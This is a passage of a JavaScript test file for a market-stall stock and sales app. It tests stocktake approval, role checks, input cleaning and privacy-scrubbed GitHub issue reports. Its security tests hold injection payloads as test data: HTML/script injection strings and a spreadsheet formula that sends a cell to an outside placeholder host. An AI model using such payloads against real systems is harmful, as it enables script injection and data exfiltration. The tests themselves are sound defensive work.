  assert.ok(act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 9 }] }).ok);
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 2 }] });
  act(SF, 'countSave', manager, { countId: id, location: 'Car', lines: [{ id: 'P02', qty: 3 }] });
  loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
  assert.strictEqual(loc.status, 'done'); assert.strictEqual(loc.items, 9);
  const review = SF.dispatch('countState', { token: tok }).data.open.review;
  const p1 = review.find((r) => r.id === 'P01'), p2 = review.find((r) => r.id === 'P02');
  assert.strictEqual(JSON.stringify([p1.expected, p1.counted, p1.diff]), '[10,7,-3]', 'the later Storeroom count wins');
  assert.strictEqual(JSON.stringify([p2.expected, p2.counted, p2.diff]), '[6,5,-1]', 'two locations add up');
  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Garden shed', lines: [] }).ok, false);
  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: -2 }] }).ok, false);
});

test('stocktake: the owner approves; stock follows the count and the loss is recorded at cost', () => {
  const { SF, sheets, tok, cashier, manager } = counting();
  const id = act(SF, 'countStart', manager).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 8 }] });
  assert.strictEqual(act(SF, 'countApprove', manager, { countId: id }).ok, false, 'Marian approves, not a manager');
  const r = act(SF, 'countApprove', tok, { countId: id });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.result.lossUnits, 3);
  assert.strictEqual(r.result.lossValue, 60, '3 Apricot Jam at R20 each');
  assert.strictEqual(r.result.foundUnits, 2);
  const hand = SF.onHand();
  assert.strictEqual(hand.P01, 7); assert.strictEqual(hand.P02, 8);
  const moves = sheets.Movements.rows.filter((m) => m[3] === 'stocktake');
  assert.strictEqual(moves.length, 2, 'two ledger lines, nothing overwritten');
  assert.ok(moves.every((m) => m[4] === 'Stocktake ' + id));
  const st = SF.dispatch('countState', { token: tok }).data;
  assert.strictEqual(st.open, null);
  assert.strictEqual(st.history[0].status, 'approved');
  assert.strictEqual(st.history[0].result.lossValue, 60);
});

test('stocktake: what nobody counted is left alone, unless the owner says there are none', () => {
  const { SF, tok, cashier } = counting();
  let id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  let r = act(SF, 'countApprove', tok, { countId: id });
  assert.strictEqual(r.result.uncounted, 1);
  assert.strictEqual(SF.onHand().P02, 6, 'Fig Jam kept');
  id = act(SF, 'countStart', tok).id;
  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
  r = act(SF, 'countApprove', tok, { countId: id, uncounted: 'zero' });
  assert.strictEqual(SF.onHand().P02, 0, 'none left');
  assert.strictEqual(r.result.lossUnits, 6);
});

test('stocktake: managers edit the locations; the list stays tidy', () => {
  const { SF, cashier, manager } = counting();
  assert.strictEqual(act(SF, 'countLocationsSave', cashier, { locations: ['X'] }).ok, false);
  const r = act(SF, 'countLocationsSave', manager, { locations: [' Storeroom ', 'storeroom', 'Car  boot', '', 'Kitchen'] });
  assert.strictEqual(JSON.stringify(r.locations), '["Storeroom","Car boot","Kitchen"]');
  assert.strictEqual(act(SF, 'countLocationsSave', manager, { locations: [] }).ok, false);
  assert.strictEqual(SF.dispatch('countState', { token: cashier }).data.locations.length, 3);
});

/* ---------- security: who may change things, and what text may hold ---------- */

test('a viewer sees the numbers but cannot change how the stall runs', () => {
  const { SF, tok } = markets3();
  SF.setPin('viewer', '3333'); SF.setPin('manager', '2222');
  const viewer = SF.dispatch('signIn', { pin: '3333', device: 'v' }).data.token;
  const manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
  let k = 0;
  const tryAs = (t, action, extra) => SF.dispatch(action, Object.assign({ token: t, opId: 'sec' + (k++) }, extra || {}));
  [['setPreordersOpen', { open: false }], ['addMarket', { name: 'Sneaky Market' }], ['releaseUnpaid', {}],
   ['setActiveMarket', { marketId: 'M02' }], ['saveLabelLook', { contact: 'x' }], ['setCollectStep', { on: true }],
   ['setHomeOrders', { open: false }], ['savePluginSettings', { plugin: 'cashup', values: {} }],
   ['saveProfile', { name: 'X' }]].forEach(([a, extra]) => {
    const r = tryAs(viewer, a, extra);
    assert.strictEqual(r.ok, false, a + ' should be refused for a viewer');
    assert.strictEqual(r.code, 'forbidden', a);
  });
  assert.strictEqual(SF.dispatch('dashboard', { token: viewer }).ok, true, 'the numbers still work for a viewer');
  assert.strictEqual(tryAs(manager, 'setPreordersOpen', { open: true }).ok, true, 'a manager may');
  assert.strictEqual(tryAs(manager, 'addMarket', { name: 'Real Market', date: day(4) }).ok, true);
  assert.strictEqual(tryAs(tok, 'setActiveMarket', { marketId: 'M02' }).ok, true, 'and the owner');
});

test('a market date must be a date, and the live market must exist', () => {
  const { SF, tok } = markets3();
  const bad = SF.dispatch('addMarket', { token: tok, opId: 'd1', name: 'Bad', date: '2099-01-01<img src=x onerror=alert(1)>' });
  assert.strictEqual(bad.ok, false);
  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd2', name: 'Good', date: '2026-12-05' }).ok, true);
  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd3', name: 'No date yet' }).ok, true);
  assert.strictEqual(SF.dispatch('setActiveMarket', { token: tok, opId: 'd4', marketId: 'zzz' }).ok, false);
  assert.strictEqual(SF.get('activeMarket'), 'M01', 'unchanged');
});

test('shop words are plain text, when saved and when read back from older data', () => {
  const { SF, tok } = markets3();
  SF.dispatch('saveProfile', { token: tok, opId: 'v1', colour: 'red;background:url(x)',
    vocab: { units: '<img src=x onerror="steal()">jars', unit: 'jar', evil: 'x' }, plugins: ['cashup', 'nope'] });
  let pr = SF.profile();
  assert.ok(!/[<>"=]/.test(pr.vocab.units), pr.vocab.units);
  assert.strictEqual(pr.vocab.evil, undefined, 'unknown words are dropped');
  assert.strictEqual(pr.colour, '#7B2D43', 'a colour must be a colour');
  assert.strictEqual(JSON.stringify(pr.plugins), '["cashup"]');
  // Data stored before this check existed is cleaned on the way out.
  SF.set('profile', JSON.stringify({ vocab: { units: '<script>bad()</script>' }, colour: 'javascript:x' }));
  pr = SF.profile();
  assert.ok(!/[<>()]/.test(pr.vocab.units), pr.vocab.units);
  assert.strictEqual(pr.colour, '#7B2D43');
});

test('Export orders keeps a customer name that starts with = as text', () => {
  const { SF, sheets, ctx } = markets3();
  assert.strictEqual(order(SF, { market: 'M01', name: '=IMAGE("https://e.tld/?"&A1)' }).ok, true);
  ctx.sfExport();
  const out = Object.keys(sheets).filter((n) => /^Orders \d/.test(n)).map((n) => sheets[n])[0];
  assert.ok(out, 'the export tab was made');
  const cell = out.rows[1][4];
  assert.ok(String(cell).startsWith("'="), 'stays text: ' + cell);
});

/* ---------- reporting a problem ---------- */

function reporter(role) {
  const env = shop(day(3));
  env.SF.setPin('owner', '4321');
  if (role !== 'owner') env.SF.setPin(role, '1111');
  const pin = role === 'owner' ? '4321' : '1111';
  env.tok = env.SF.dispatch('signIn', { pin, device: 'd' }).data.token;
  return env;
}

test('a cashier can report a problem; it is kept in the Issues tab', () => {
  const { SF, sheets, tok, gh } = reporter('cashier');
  const r = SF.dispatch('reportIssue', { token: tok, opId: 'r1', message: 'Take payment does nothing', screen: 'till' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.sent, false, 'no GitHub token yet, so only the sheet has it');
  assert.strictEqual(gh.length, 0);
  const row = sheets.Issues.rows[1];
  assert.strictEqual(row[5], 'Take payment does nothing');
  assert.ok(String(row[7]).startsWith('saved'), row[7]);
});

test('with a GitHub token the report opens one labelled issue, with no phone number or e-mail', () => {
  const { SF, sheets, props, tok, gh } = reporter('owner');
  props.GITHUB_TOKEN = 'ghp_SECRETSECRET';
  const r = SF.dispatch('reportIssue', { token: tok, opId: 'r2', screen: 'till',
    message: 'Anna 082 123 4567 anna@example.com could not pay',
    failed: [{ action: 'sell', message: 'Only 0 left of Guava Jam' }] });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.sent, true);
  assert.strictEqual(gh.length, 1);
  const sent = JSON.parse(gh[0].opts.payload);
  assert.ok(/082|anna@example/.test(JSON.stringify(sent)) === false, 'personal details leaked: ' + sent.body);
  assert.ok(sent.body.indexOf('[number]') !== -1 && sent.body.indexOf('[email]') !== -1);
  assert.deepStrictEqual(sent.labels, ['app-report']);
  assert.ok(sent.body.indexOf('ghp_SECRET') === -1, 'the token must never be in the issue');
  assert.strictEqual(sheets.Issues.rows[1][7], 'sent');
  assert.strictEqual(sheets.Issues.rows[1][8], 'https://github.com/o/r/issues/7');
  assert.ok(/Bearer ghp_/.test(gh[0].opts.headers.Authorization));
});

test('a retried report does not open a second GitHub issue', () => {
  const { SF, props, tok, gh } = reporter('owner');
  props.GITHUB_TOKEN = 'ghp_x';
  SF.dispatch('reportIssue', { token: tok, opId: 'same', message: 'Labels will not print' });
  const again = SF.dispatch('reportIssue', { token: tok, opId: 'same', message: 'Labels will not print' });
  assert.strictEqual(again.replayed, true);
  assert.strictEqual(gh.length, 1);
});

test('an empty report is refused and at most 5 an hour are accepted', () => {
  const { SF, tok } = reporter('owner');
  assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'e', message: 'hi' }).ok, false);
  for (let i = 0; i < 5; i++) {
    assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'n' + i, message: 'Problem number ' + i }).ok, true);
  }
  assert.strictEqual(SF.dispatch('reportIssue', { token: tok, opId: 'n6', message: 'One more problem' }).ok, false);
});

test('connecting reports checks the token with GitHub before keeping it', () => {
  const { SF, props } = shop(day(3));
  assert.strictEqual(SF.reportsConnected(), false);
  assert.strictEqual(SF.connectGithub('not a token').ok, false);
  assert.strictEqual(SF.connectGithub('github_pat_' + 'x'.repeat(30)).ok, false, 'GitHub refused it');
  assert.strictEqual(props.GITHUB_TOKEN, undefined, 'a refused token is not kept');
  const r = SF.connectGithub('  github_pat_good' + 'x'.repeat(30) + '  ');
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(props.GITHUB_TOKEN, 'github_pat_good' + 'x'.repeat(30));
  assert.strictEqual(SF.reportsConnected(), true);
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  assert.strictEqual(SF.dispatch('health', { token: tok }).data.reports, true);
});

test('reporting needs a sign-in', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(SF.dispatch('reportIssue', { opId: 'x', message: 'Anything at all' }).ok, false);
});

console.log(failures ? '\n' + failures + ' failed' : '\nall passed');
process.exit(failures ? 1 : 0);
